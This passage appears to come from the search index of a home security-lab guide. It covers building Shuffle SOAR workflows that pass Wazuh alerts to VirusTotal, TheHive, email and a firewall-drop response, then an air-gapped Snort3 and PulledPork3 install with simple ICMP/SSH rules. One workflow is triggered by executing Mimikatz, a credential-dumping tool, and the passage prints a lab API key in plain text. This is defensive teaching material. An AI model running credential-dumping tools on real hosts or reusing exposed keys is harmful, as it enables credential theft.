to\u00a0Receive_Wazuh_alerts. Set the call option to \u201c<code>$exec</code>\u201d, and save the workflow. This Shuffle app now repeats the events that are received by the\u00a0Wazuh alerts\u00a0webhook. This allows us to test that Shuffle can receive Wazuh alerts.</p> <p></p> <p>On Windows host, open PowerShell as Administrator and execute mimikatz (justanexe)</p> <p></p> <p>On Wazuh server, verify logs related to Mimikatz are generated </p> <pre><code>tail /var/ossec/logs/integrations.log\n</code></pre> <p>Verify Shuffle is receiving alerts without any errors </p> <p>Alerts should be green indicating status is FINISHED</p> <p></p> <p></p> <p>The results displays a SHA1, MD5 and SHA256 hashes</p> <p></p> <pre><code>SHA1=E3B6EA8C46FA831CEC6F235A5CF48B38A4AE8D69,MD5=29EFD64DD3C7FE1E2B022B7AD73A1BA5,SHA256=61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1,IMPHASH=55EE500BB4BDFC49F27A98AE456D8EDF\n</code></pre> <p>Create a regular expression to specifically extract the SHA256 hash from the string.</p> <pre><code>SHA256=([A-Fa-f0-9]{64})\n</code></pre> <p>Click Shuffle Tools icon. Change the Name to Capture_SHA256_HASH, Find Actions to Regex Capture group, Input data to $exec.text.win.eventdata.hashes and Regex to SHA256=([A-Fa-f0-9]{64})</p> <p></p> <p>Save the workflow. Trigger the rule id 100200 by running mimikatz (justanexe) from Windows host.</p> <p>You should see SHA256 hash returned in the results. If you are not seeing the SHA256 hash, try restarting your Shuffle by running <code>docker compose down</code>  and <code>docker compose up -d</code></p> <p></p> <p>Drag and drop Virustotal app. Change the Name to Virustotal, set Find Actions to Get a has report.</p> <p>Click Authenticate VirusTotal V3 and copy and paste your VirusTotal API key. You must create an account in VirusTotal to obtain the API key. Note: Internet connection was enabled from this point.</p> <p></p> <p></p> <p>For ID, select Capture_SHA256_Hash list</p> <p></p> <p></p> <p>Save the workflow. Restart Shuffle if required.</p> <p>Verify that Virustotal get_a_hash_report returns SHA256 hash of mimikatz with status code 200.</p> <p>Expand the last_analysis_stats. Malicious: 65 indicates that 65 scanners have detected this executable as malicious. </p> <p></p> <p></p>"},{"location":"shuffle/shuffle.html#configure-thehive","title":"Configure TheHive","text":"<p>Login to TheHive web UI</p> <p>Create a new organisation called Cyber and click Confirm</p> <p></p> <p>Click Cyber organisation</p> <p>Add a new user with following details</p> <ul> <li>Type: Normal</li> <li>Login: cyber@test.com</li> <li>Name: cyber</li> <li>Profile: analyst</li> </ul> <p>Save and add another user</p> <p></p> <p>Add the second user with following details</p> <ul> <li>Type: Service</li> <li>Login: shuffle@test.com</li> <li>Name: SOAR</li> <li>Profile: analyst</li> </ul> <p></p> <p>Click Preview on the cyber user and set a new password</p> <p></p> <p>Click Preview on the SOAR user and create an API key</p> <p>Copy the API key <code>Gq9gm4G4Vx2/Hajy0ezbwNbKVozXCgzR</code></p> <p></p> <p>Log out of the web UI as admin and login as the cyber user.</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-shuffle_2","title":"Configure Shuffle","text":"<p>Drag and drop TheHive app to the Workflow.</p> <p>Click TheHive App and click Authenticate TheHive.</p> <p></p> <p>Copy and paste the API key <code>Gq9gm4G4Vx2/Hajy0ezbwNbKVozXCgzR</code></p> <p>Enter the url for TheHive <code>http://10.0.0.40:9000</code></p> <p>Click Submit.</p> <p></p> <p>Set Find Actions to Create alert</p> <p></p> <p>Connect Virustotal App to TheHive app</p> <p>There seems to be a bug with how TheHive app handles some of its parameters at the backend.</p> <p>To bypass the error, set the values for Flag and Pap in JSON first.</p> <p>Uncheck Show Body textbox. You should see Hide Body. Click Expand Window icon.</p> <p></p> <p>Manually set the Flag to false and Pap to 2. Click Submit.</p> <pre><code>{\n  \"description\": \"{{ '''${description}''' | replace: '\\n', '\\\\r\\\\n' }}\",\n  \"externallink\": \"${externallink}\",\n  \"flag\": false,\n  \"pap\": 2,\n  \"severity\": \"${severity}\",\n  \"source\": \"${source}\",\n  \"sourceRef\": \"${sourceref}\",\n  \"status\": \"${status}\",\n  \"summary\": \"${summary}\",\n  \"tags\": \"${tags}\",\n  \"title\": \"${title}\",\n  \"tlp\": ${tlp},\n  \"type\": \"${type}\"\n}\n</code></pre> <p></p> <p>Check the Show Body and this will allow you to edit the app in GUI.</p> <p></p> <p>Set the values to the following.</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> Name Create_Alert Severity 2 Summary Mimikatz detected on host: (computer) and the processID: (processID) and commandLine: (commandLine) Tags [\u201dT1003\u201d] Title (title) Description (rule description) Flag false Pap 2 Source Wazuh Sourceref Incident-(timestamp) Status New Tlp 2 Type Internal <p>Save the workflow. Click Show Execution (person icon) then rerun the workflow (refresh icon).</p> <p></p> <p></p> <p>Verify status code from TheHive is 201</p> <p></p> <p>Verify that the Mimikatz Usage Detected alert is generated on TheHive UI.</p> <p></p> <p>Click on the alert to view the details.</p> <p></p> <p>Drag and drop the Email app to the workflow.</p> <p>Edit the Email app with following details:</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> Name Email Find Actions Send email shuffle Apikey (Create account on https://shuffler.io/ to obtain API key) Recipients (Email address receiving the alert) Subject Mimikatz detected Body Time: (utcTime) Title: (title) Host: (computer) Malicious: (malicious)* <p>*Select VirusTotal metadata instead of the Execution Argument |</p> <p></p> <p>Save and rerun the workflow. If you want to get status code 201 from TheHive, you must delete existing alert. Verify that the results are successful and you received the email. </p> <p></p> <p></p> <p>Duplicate TheHive app in the workflow. </p> <p>Edit the TheHive app with following details:</p> <p>Note: the values in brackets indicate the metadata from Create_Alert. Add the data by clicking the <code>+</code> icon. </p> Name Create_Case Alertid (body id) <p></p> <p></p> <p>Save and rerun the workflow. You may need to delete existing alert in TheHive. </p> <p>Verify that results return status code 201.</p> <p></p> <p>Verify that the case has been created in TheHive.</p> <p></p>"},{"location":"shuffle/shuffle.html#workflow-two","title":"Workflow Two","text":""},{"location":"shuffle/shuffle.html#configure-shuffle_3","title":"Configure Shuffle","text":""},{"location":"shuffle/shuffle.html#create-a-workflow_1","title":"Create a Workflow","text":"<p>Repeat the steps covered in Introduction to Shuffle.</p> <p>Create a new workflow called SOC Automation Example Two. </p> <p>Click on the\u00a0Triggers\u00a0tab in the bottom left and drag the\u00a0Webhook\u00a0to the workspace.</p> <p>Click on the webhook and rename it to\u00a0Wazuh alerts. Copy and save the webhook URI and start the webhook. The webhook URI looks like the following: </p> <p><code>http://10.0.0.28:3001/api/v1/hooks/webhook_d8fde57c-5501-4063-8954-00af9f3056d3</code></p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-server_1","title":"Configure Wazuh server","text":"<p>Download the custom integration script custom-shuffle and custom-shuffle.py. Save it as custom-shuffle and custom-shuffle.py in /var/ossec/integrations directory. The script must contain execution permissions and belong to the\u00a0<code>root</code>\u00a0user of the\u00a0<code>wazuh</code>\u00a0group: </p> <pre><code>chmod 750 /var/ossec/integrations/custom-shuffle*\nchown root:wazuh /var/ossec/integrations/custom-shuffle*\n</code></pre> <p>Copy and paste the following into /var/ossec/etc/ossec.conf</p> <p>The rule id 100100 has been configured to use Wazuh\u2019s active response to block malicious IP address. Refer to Blocking a known malicious actor (testing custom active response) from Introduction to Wazh. </p> <pre><code> &lt;integration&gt;\n      &lt;name&gt;custom-shuffle&lt;/name&gt;\n      &lt;rule_id&gt;**100100**&lt;/rule_id&gt;\n      &lt;hook_url&gt;**http://10.0.0.28:3001/api/v1/hooks/webhook_d8fde57c-5501-4063-8954-00af9f3056d3**&lt;/hook_url&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n</code></pre> <p>Restart the Wazuh manager service to apply changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre> <p>Verify that there are no errors in the ossec and integrations logs</p> <pre><code>tail /var/ossec/logs/ossec.log \ntail /var/ossec/logs/integrations.log\n</code></pre>"},{"location":"shuffle/shuffle.html#configure-shuffle_4","title":"Configure Shuffle","text":"<p>Click on the Shuffle Tools app named \u201cChange me\u201d and rename it to\u00a0Receive_Wazuh_alerts. Set the call option to \u201c<code>$exec</code>\u201d, and save the workflow. This Shuffle app now repeats the events that are received by the\u00a0Wazuh alerts\u00a0webhook. This allows us to test that Shuffle can receive Wazuh alerts.</p> <p></p> <p>Save the workflow.</p> <p>On kali machine, run curl command to access http://10.0.0.26</p> <pre><code>curl http://10.0.0.26 \n</code></pre> <p>On Wazuh manager, verify that this has triggered an alert by checking integrations log </p> <pre><code>tail /var/ossec/logs/integrations.log\n</code></pre> <p>On Shuffle, click Show Executions and verify that there is a successful result.</p> <p></p> <p>Drag and Drop HTTP app to the workflow.</p> <p>Edit the app with following detals:</p> <p>For Statement, use your wazuh API user\u2019s credentials.</p> Name Get-Wazuh-API Find Actions Curl Statement curl -u wazuh-wui:\"password\" -k -X GET \"https://10.0.0.20:55000/security/user/authenticate?raw=true\" <p></p> <p></p> <p>Drag and Drop Virustotal, Email and Wazuh apps to the workflow. Connect the apps in the order shown below:</p> <p></p> <p>Edit the Wazuh app with following details:</p> <p>Note: Arguments must be an array format <code>[\"value1\"]</code></p> Name Wazuh Find Actions Run Command Apikey (Get-Wazuh-API) Url https://10.0.0.20:55000 Agents list (agent id) Wait for complete true Arguments [\u201d(srcip)\u201d] Commnad firewall-drop60 <p>If you get an error with retrieving Wazuh API key, manually authenticate Wazuh App by providing Wazuh API key and Wazuh URL. Obtain API key from Get-Wazuh-API app (you will need to run your workflow to get the result):</p> <p></p> <p></p> <p>On Wazuh Manager, verify that active response is configured in ossec.conf</p> <p>The\u00a0<code>firewall-drop</code>\u00a0command integrates with the Ubuntu local iptables firewall and drops incoming network connection from the attacker endpoint for 60 seconds:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;active-response&gt;\n    &lt;command&gt;firewall-drop&lt;/command&gt;\n    &lt;location&gt;local&lt;/location&gt;\n    &lt;rules_id&gt;100100&lt;/rules_id&gt;\n    &lt;timeout&gt;60&lt;/timeout&gt;\n  &lt;/active-response&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p>When using the API, use the active-response command appended with timeout value. For example:</p> <pre><code>firewall-drop60\n</code></pre> <p>You can verify the command name to use with API by running <code>agent-control -L</code> located in /var/ossec/bin/</p> <pre><code>[root@Centos siem]# cd /var/ossec/bin\n[root@Centos bin]# ./agent_control -L\n\nWazuh agent_control. Available active responses:\n\n   Response name: firewall-drop60, command: firewall-drop\n</code></pre> <p>Edit the Virustotal app with following details:</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> <p>Authenticate with your VirusTotal API key (you will need to create an account).</p> Name Virustotal Find Actions Gen an IP address report IP (srcip) <p></p> <p>Save the workflow. Make sure webhook has been started. </p> <p>Trigger alert by running curl command from Kali machine:</p> <p>Note: for demonstration purposes, two network adapters have been assigned to both Ubuntu and Kali hosts. The network 192.168.1.0/24 belongs to Bridged network (Adapter #1) and 10.0.0.0/24 belongs to LAN segment (Adapter #2).  </p> <pre><code>curl http://10.0.0.26\ncurl http://192.168.1.111\n</code></pre> <p>Edit the Email app with following details:</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> Name Email Find Actions Send email shuffle Apikey (Create account on https://shuffler.io/ to obtain API key) Recipients (Email address receiving the alert) Subject Malicious activity detected Body Title: (title) Timestamp: (timestamp) Source IP: (srcip) Malicious: (malicious)* VirusTotal Result: (result)* <p>*These metadata are obtained from Virustotal instead of Execution Argument |</p> <p></p> <p>Save workflow. Trigger alert by accessing http://192.168.1.111 from Kali machine multiple times in a row.</p> <pre><code>curl http://192.168.1.111\n</code></pre> <p>Verify that workflow returns successful result. Verify status code 200 is returned by Virustotal and Wazuh. </p> <p></p> <p>Verify that active response blocks Kali machine:</p> <p></p> <p>Verify that you received an email from Shuffle:</p> <p></p>"},{"location":"shuffle/shuffle.html#references","title":"References","text":"<ul> <li>https://medium.com/shuffle-automation/introducing-shuffle-an-open-source-soar-platform-part-1-58a529de7d12</li> <li>https://github.com/Shuffle/Shuffle/blob/main/.github/install-guide.md</li> <li>https://docs.docker.com/desktop/install/ubuntu/</li> <li>https://shuffler.io/docs/configuration#servers</li> <li>https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository</li> <li>https://wazuh.com/blog/integrating-wazuh-with-shuffle/</li> <li>https://documentation.wazuh.com/current/user-manual/manager/integration-with-external-apis.html</li> <li>https://youtu.be/GNXK00QapjQ?si=OHCAyUO2IAMzZF0U</li> <li>https://youtu.be/FBISHA7V15c?si=26Qe8BxiPxJVx7FP</li> </ul>"},{"location":"snort/snort.html","title":"Snort","text":""},{"location":"snort/snort.html#snort","title":"Snort","text":"<p>Snort is an open-source network intrusion detection and prevention system (IDS/IPS) maintained by Cisco Systems. It is designed to monitor network traffic in real-time, analysing packets for signs of malicious activity, such as attacks, probes, or scans. Snort uses a combination of protocol analysis, content searching, and various preprocessors to detect and prevent intrusions.</p>"},{"location":"snort/snort.html#install-snort3-on-host","title":"Install Snort3 on Host","text":"<p>In this demonstration, we will be installing Snort3 on an Ubuntu virtual machine. We will be simulating install in an air-gapped environment but note that some parts of the step requires internet connection.</p>"},{"location":"snort/snort.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, attack simulation was conducted on the Kali machine in a safe and controlled setting. </p> <p>Note: Do not attempt to replicate the attack simulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack simulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address pfsense FreeBSD (pfSense v2.7.2) Firewall/Router (Gateway IDS/IPS) 192.168.1.200 (WAN) / 10.0.0.2 (LAN) Snort Ubuntu 22.04 LTS Host IDS/IPS 10.0.0.22 WS2019 Windows Server 2019 Windows client 10.0.0.24 Kali Kali Linux 2024.2 Attacker machine 10.0.0.29 <p></p>"},{"location":"snort/snort.html#download-pre-requisites","title":"Download Pre-requisites","text":"<p>On a machine with internet connection:</p> <p>Make a folder called /snort/pre-reqs and cd into it.</p> <pre><code>mkdir snort/pre-reqs\ncd snort/pre-reqs\n</code></pre> <p>Update the package lists and upgrade all the installed packages on your system to the latest available versions.</p> <pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade -y\n</code></pre> <p>Download the required packages and their dependencies as a root user:</p> <pre><code>apt-get install -y --download-only build-essential autotools-dev libdumbnet-dev libluajit-5.1-dev \\\nlibpcap-dev zlib1g-dev pkg-config libhwloc-dev cmake liblzma-dev openssl libssl-dev cpputest \\\nlibsqlite3-dev libtool uuid-dev git autoconf bison flex libcmocka-dev libnetfilter-queue-dev \\\nlibunwind-dev libmnl-dev ethtool libjemalloc-dev libpcre3-dev libpcre16-3 libpcre32-3 libpcrecpp0v5 -o Dir::Cache::archives=\"/home/cyber/snort/pre-reqs\"\n\n#apt-get download libpcre3-dev libpcre16-3 libpcre32-3 libpcrecpp0v5\n</code></pre> <p>If you get permission error, change the directory\u2019s permission</p> <p>Error message:</p> <pre><code>W: Download is performed unsandboxed as root as file '/home/cyber/snort/pre-reqs/libpcre16-3_2%3a8.39-13ubuntu0.22.04.1_amd64.deb' couldn't be accessed by user '_apt'. - pkgAcquire::Run (13: Permission denied)\n</code></pre> <p>Change the directory permission:</p> <pre><code>sudo chmod 755 /home/cyber/snort/pre-reqs\n</code></pre>"},{"location":"snort/snort.html#download-dependencies-and-snort3","title":"Download Dependencies and Snort3","text":"<p>Change directory into snort</p> <pre><code>cd ~/snort\n</code></pre> <p>Download dependencies (pcre, gperftools, ragel, boost, hyperscan, flatbuffers, libdaq, pulledpork3) and Snort by running:</p> <pre><code>wget https://github.com/PCRE2Project/pcre2/releases/download/pcre2-10.44/pcre2-10.44.tar.gz\nwget https://github.com/gperftools/gperftools/releases/download/gperftools-2.15/gperftools-2.15.tar.gz\nwget https://www.colm.net/files/ragel/ragel-6.10.tar.gz\nwget https://boostorg.jfrog.io/artifactory/main/release/1.86.0/source/boost_1_86_0.tar.gz\nwget [https://github.com/intel/hyperscan/archive/refs/tags/v5.4.2.tar.gz](https://github.com/intel/hyperscan/archive/refs/tags/v5.4.2.tar.gz) -O hyperscan-v5.4.2.tar.gz\nwget https://github.com/google/flatbuffers/archive/refs/tags/v2.0.0.tar.gz -O flatbuffers-v2.0.0.tar.gz\nwget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.16.tar.gz -O libdaq-v3.0.16.tar.gz\nwget [https://github.com/snort3/snort3/archive/refs/tags/3.3.5.0.tar.gz](https://github.com/snort3/snort3/archive/refs/tags/3.3.5.0.tar.gz) -O snort3-3.3.5.0.tar.gz\ngit clone https://github.com/shirkdog/pulledpork3.git\n</code></pre>"},{"location":"snort/snort.html#install-pre-requisites","title":"Install Pre-requisites","text":"<p>Transfer the snort folder to your air-gapped host. </p> <p>Change directory into pre-reqs and install the downloaded <code>.deb</code> files using <code>dpkg</code>:</p> <pre><code>sudo dpkg -i *.deb\n</code></pre>"},{"location":"snort/snort.html#install-dependencies","title":"Install Dependencies","text":"<p>Change directory into snort folder and untar pcre2-10.44.tar.gz</p> <p>Change directory into pcre2-10.44 and run configure.</p> <p>Run make and then sudo make install.</p> <pre><code>tar -xzvf pcre2-10.44.tar.gz\ncd pcre2-10.44/\n./configure\nmake\nsudo make install\n</code></pre> <p>Repeat the same process for gperftools-2.15.tar.gz</p> <pre><code>tar -xzvf gperftools-2.15.tar.gz\ncd gperftools-2.15/\n./configure\nmake\nsudo make install\n</code></pre> <p>Repeat the same process for ragel</p> <pre><code>tar -xzvf ragel-6.10.tar.gz\ncd ragel-6.10\n./configure\nmake\nsudo make install\n</code></pre> <p>Untar Boost C++ Libraries:</p> <pre><code>tar -xvzf boost_1_86_0.tar.gz\n</code></pre> <p>For installing hyerperscan, run:</p> <pre><code>tar -xvzf hyperscan-v5.4.2.tar.gz\nmkdir ~/snort/hyperscan-5.4.2-build\ncd hyperscan-5.4.2-build/\ncmake -DCMAKE_INSTALL_PREFIX=/usr/local -DBOOST_ROOT=~/snort/boost_1_86_0/ ../hyperscan-5.4.2\nmake\nsudo make install\n</code></pre> <p>Install flatbuffers:</p> <pre><code>tar -xzvf flatbuffers-v2.0.0.tar.gz\nmkdir flatbuffers-build\ncd flatbuffers-build\ncmake ../flatbuffers-2.0.0\nmake\nsudo make install\n</code></pre> <p>Install Data Acquistion (DAQ) from Snort</p> <pre><code>tar -xzvf libdaq-v3.0.16.tar.gz\ncd libdaq-3.0.16\n./bootstrap\n./configure\nmake\nsudo make install\n</code></pre> <p>Update the system's dynamic linker run-time bindings (shared libraries)</p> <pre><code>sudo ldconfig\n</code></pre> <p>Install the latest version of Snort 3</p> <pre><code>tar -xzvf snort3-3.3.5.0.tar.gz\ncd snort3-3.3.5.0/\n./configure_cmake.sh --prefix=/usr/local --enable-jemalloc\ncd build\nmake\nsudo make install\n</code></pre> <p>Verify Snort3 is installed by running:</p> <pre><code>/usr/local/bin/snort -V\n\n   ,,_     -*&gt; Snort++ &lt;*-\n  o\"  )~   Version 3.3.5.0\n   ''''    By Martin Roesch &amp; The Snort Team\n           http://snort.org/contact#team\n           Copyright (C) 2014-2024 Cisco and/or its affiliates. All rights reserved.\n           Copyright (C) 1998-2013 Sourcefire, Inc., et al.\n           Using DAQ version 3.0.16\n           Using Hyperscan version 5.4.2 2024-09-10\n           Using Jemalloc version 5.2.1-0-gea6b3e973b477b8061e0076bb257dbd7f3faa756\n           Using libpcap version 1.10.1 (with TPACKET_V3)\n           Using LuaJIT version 2.1.0-beta3\n           Using LZMA version 5.2.5\n           Using OpenSSL 3.0.2 15 Mar 2022\n           Using PCRE version 8.39 2016-06-14\n           Using ZLIB version 1.2.11\n</code></pre> <p>Test snort by using its default config file:</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua\n...\nSnort successfully validated the configuration (with 0 warnings).\n</code></pre> <p>Find your network interface by running <code>ip a</code></p> <pre><code>ip a\n...\n2: ens32: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000\n    link/ether 00:0c:29:86:08:64 brd ff:ff:ff:ff:ff:ff\n    altname enp2s0\n    inet 10.0.0.22/24 brd 10.0.0.255 scope global dynamic noprefixroute ens32\n</code></pre> <p>Run following:</p> <pre><code>sudo ethtool -k ens32 | grep receive-offload\n...\ngeneric-receive-offload: on\nlarge-receive-offload: off [fixed]\n</code></pre> <p>Create a service to disable Large Receive Offload (LRO)</p> <pre><code>sudo nano /lib/systemd/system/ethtool.service\n</code></pre> <p>Copy and paste following:</p> <p>Put your network interface </p> <pre><code>[Unit]\nDescription=Ethtool Configration for Network Interface\n\n[Service]\nRequires=network.target\nType=oneshot\nExecStart=/sbin/ethtool -K ens32 gro off\nExecStart=/sbin/ethtool -K ens32 lro off\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Enable and start the service</p> <pre><code>sudo systemctl enable ethtool\nsudo service ethtool start\n</code></pre> <p>Verify that LRO is disabled by running</p> <pre><code>sudo ethtool -k ens32 | grep receive-offload\n...\ngeneric-receive-offload: off\nlarge-receive-offload: off [fixed]\n</code></pre>"},{"location":"snort/snort.html#test-ids-with-local-rules","title":"Test IDS with local rules","text":"<p>Create a folder called rules in the following directory</p> <pre><code>sudo mkdir /usr/local/etc/rules\n</code></pre> <p>Create a file called local.rules</p> <pre><code>sudo nano /usr/local/etc/rules/local.rules\n</code></pre> <p>Copy and paste following</p> <p>First alert detects any ICMP Ping traffic and second alert detects any SSH Authentication Attempt to our internal network </p> <pre><code>alert icmp any any -&gt; $HOME_NET any (msg:\"ICMP Ping Detected\"; sid:1000001; rev:1;)\nalert tcp any any -&gt; $HOME_NET 22 (msg:\"SSH Authentication Attempt\"; sid:1000002; rev:1;)\n</code></pre> <p>Run snort with configuration file to test the rule</p> <pre><code>snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules\n...\nSnort successfully validated the configuration (with 0 warnings).\n</code></pre> <p>Run snort to generate alert in a single line</p> <p>Snort will be listening on ens32 for any icmp traffic</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules -i ens32 -A alert_fast\n</code></pre> <p>From another Linux host, execute ping and attempt ssh to 10.0.0.22. This will generate alerts on terminal verifying that the rule works:</p> <pre><code>09/11-22:01:05.659667 [**] [1:1000002:1] \"SSH Authentication Attempt\" [**] [Priority: 0] {TCP} 10.0.0.21:36708 -&gt; 10.0.0.22:22\n09/11-22:01:19.086427 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.21 -&gt; 10.0.0.22\n</code></pre> <p>Edit Snort\u2019s configuration </p> <pre><code>sudo nano /usr/local/etc/snort/snort.lua\n</code></pre> <p>For HOME_NET, setup the network addresses you are protecting.</p> <p>For EXTERNAL_NET, leave as any.</p> <p>In the ips section, uncomment enable_builtin_rules = true and add include = \u201c/usr/local/etc/rules/local.rules\u201d, (include comma)</p> <p>In the configure ourputs section uncomment alert_fast = {file=true} to enable logging for the alerts</p> <pre><code>-- HOME_NET and EXTERNAL_NET must be set now\n-- setup the network addresses you are protecting\nHOME_NET = '10.0.0.0/24'\n\n-- set up the external network addresses.\n-- (leave as \"any\" in most situations)\nEXTERNAL_NET = 'any'\n...\nips =\n{\n    -- use this to enable decoder and inspector alerts\n    enable_builtin_rules = true,\n\n    -- use include for rules files; be sure to set your path\n    -- note that rules files can include other rules files\n    -- (see also related path vars at the top of snort_defaults.lua)\n    include = \"/usr/local/etc/rules/local.rules\",\n    variables = default_variables\n}\n...\n---------------------------------------------------------------------------\n-- 7. configure outputs\n---------------------------------------------------------------------------\n-- event logging\n-- you can enable with defaults from the command line with -A &lt;alert_type&gt;\n-- uncomment below to set non-default configs\n--alert_csv = { }\nalert_fast = {file=true}\n</code></pre> <p>Run snort to generate alert in a single line but exclude entry for local rules.</p> <p>Snort will be listening on ens32 for any icmp traffic</p> <pre><code>sudo snort -c /usr/local/etc/snort/snort.lua -i ens32 -A alert_fast\n</code></pre> <p>Verify that alerts are generated from ping</p> <pre><code>09/11-21:41:15.522160 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.24 -&gt; 10.0.0.22\n09/11-21:41:15.522206 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.22 -&gt; 10.0.0.24\n</code></pre> <p>To output alert_fast as a text log file, run</p> <pre><code>mkdir /var/log/snort\nsudo chown -R 1000:1000 /var/log/snort\n...\nsudo snort -c /usr/local/etc/snort/snort.lua -i ens32 -A alert_fast -l /var/log/snort\n</code></pre> <p>Verify that alert_fast.txt file is generated</p> <pre><code>ls /var/log/snort\n...\ncat /var/log/snort/alert_fast.txt\n...\n09/11-23:16:18.831740 [**] [1:1000001:1] \"ICMP Ping Detected\" [**] [Priority: 0] {ICMP} 10.0.0.21 -&gt; 10.0.0.22\n09/11-23:16:37.707792 [**] [1:1000002:1] \"SSH Authentication Attempt\" [**] [Priority: 0] {TCP} 10.0.0.21:60514 -&gt; 10.0.0.22:22\n</code></pre>"},{"location":"snort/snort.html#install-pulledpork3","title":"Install Pulledpork3","text":"<p>Note <code>git clone https://github.com/shirkdog/pulledpork3.git</code> command was run when downloading dependencies.</p> <pre><code>cd ~/snort/pulledpork3\nsudo mkdir /usr/local/bin/pulledpork3\nsudo cp pulledpork.py /usr/local/bin/pulledpork3\nsudo cp -r lib/ /usr/local/bin/pulledpork3\nsudo chmod +x /usr/local/bin/pulledpork3/pulledpork.py\nsudo mkdir /usr/local/etc/pulledpork3\nsudo cp etc/pulledpork.conf /usr/local/etc/pulledpork3/\n</code></pre> <p>Verify that pulled pork is running</p> <pre><code>/usr/local/bin/pulledpork3/pulledpork.py -V\n\nPulledPork v3.0.0.5\n\n    https://github.com/shirkdog/pulledpork3\n      _____ ____\n     `----,\\    )   PulledPork v3.0.0.5\n      `--==\\\\  /    Lowcountry yellow mustard bbq sauce is the best bbq sauce. Fight me.\n       `--==\\\\/\n     .-~~~~-.Y|\\\\_  Copyright (C) 2021 Noah Dietrich, Colin Grady, Michael Shirk\n  @_/        /  66\\_  and the PulledPork Team!\n    |    \\   \\   _(\")\n     \\   /-| ||'--'   Rules give me wings!\n      \\_\\  \\_\\\\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n</code></pre> <p>Edit pulledpork.conf </p> <pre><code>sudo nano /usr/local/etc/pulledpork3/pulledpork.conf\n</code></pre> <p>Change the community ruleset value to true.</p> <p>Yon can select registered ruleset but due to incompatibility between registered ruleset version (3.1.7.0) and the snort version (3.3.5.0), selecting registered ruleset will give you an error. Either install Snort v 3.1.X.X or wait for registered ruleset version (3.3.X.X) to get released or use the community ruleset in the meantime. </p> <p>Copy and paste your Oinkcode (API Key). This step is optional.</p> <p>Comment out blocklist_path</p> <p>Uncomment snort_path and make sure it is set to the right path</p> <p>Uncomment local_rules and make sure it is set to the right path</p> <p>Comment sorule_path (optional but if uncommented, make a directory /usr/local/etc/so_rules/)</p> <pre><code># Which Snort/Talos rulesets do you want to download (recomended: choose only one)\ncommunity_ruleset = true\nregistered_ruleset = false\nLightSPD_ruleset = false\n\n# Your Snort oinkcode is required for snort/talos Subscription, Light_SPD, and Registered rules&gt;\noinkcode = \n\n# Where to write the blocklist file (single file containing all blocklists downloaded)\n#blocklist_path = /usr/local/etc/lists/default.blocklist\n\n# Where is the Snort Executable located (if not on the system path)\nsnort_path = /usr/local/bin/snort\n\n# Local Rules files\n# Specify local rules files, comma-separated\nlocal_rules = /usr/local/etc/rules/local.rules  \n\n# where should so rules be saved\n# so rules will only be processed if this is uncommented\nsorule_path = /usr/local/etc/so_rules/\n</code></pre> <p>To obtain the Oinkcode, create an account in Snort3.</p> <p></p> <p>Run Pulledpork3 </p> <pre><code>sudo /usr/local/bin/pulledpork3/pulledpork.py -c /usr/local/etc/pulledpork3/pulledpork.conf\n</code></pre> <p>If you receive error below, make a directory called so_rules</p> <pre><code>ERROR: `sorule_path` is configured but is not a directory:  /usr/local/etc/so_rules/\n...\nsudo mkdir /usr/local/etc/so_rules/\n</code></pre>"},{"location":"snort/snort.html#troubleshooting-for-registered-ruleset","title":"Troubleshooting for Registered Ruleset","text":"<p>If you have selected registered ruleset and receive the error below, edit snort rules version number in pulledpork.py</p> <pre><code>WARNING: Unable to load rules archive:  422 Client Error: Unprocessable Content for url: https://snort.org/rules/snortrules-snapshot-3350.tar.gz?oinkcode=&lt;hidden&gt;\n</code></pre> <p>Make a backup copy of pulledpork.py and edit pulledpork.py</p> <pre><code>sudo cp /usr/local/bin/pulledpork3/pulledpork.py /usr/local/bin/pulledpork3/oldpulledpork.py\nsudo nano /usr/local/bin/pulledpork3/pulledpork.py\n</code></pre> <p>Edit RULESET_URL_SNORT_REGISTERED</p> <p>The snortrules-snapshot version number can be found on https://www.snort.org/downloads</p> <p>The numbers indicate version number so 31730 (v3.1.7.0) is the latest registered Snort rulest. </p> <p>Community rules are free and maintained by the Snort community. Registered rules are available for free but require you to create an account on the Snort website and obtain an Oinkcode. Subscriber rules required a paid subscription and provides immediate access to the most up-to-date rules. </p> <pre><code>RULESET_URL_SNORT_REGISTERED = 'https://snort.org/rules/snortrules-snapshot-31470.tar.gz'\n</code></pre>"},{"location":"snort/snort.html#test-ids-with-community-ruleset","title":"Test IDS with Community Ruleset","text":"<p>Rerun Pulledpork:</p> <pre><code>sudo /usr/local/bin/pulledpork3/pulledpork.py -c 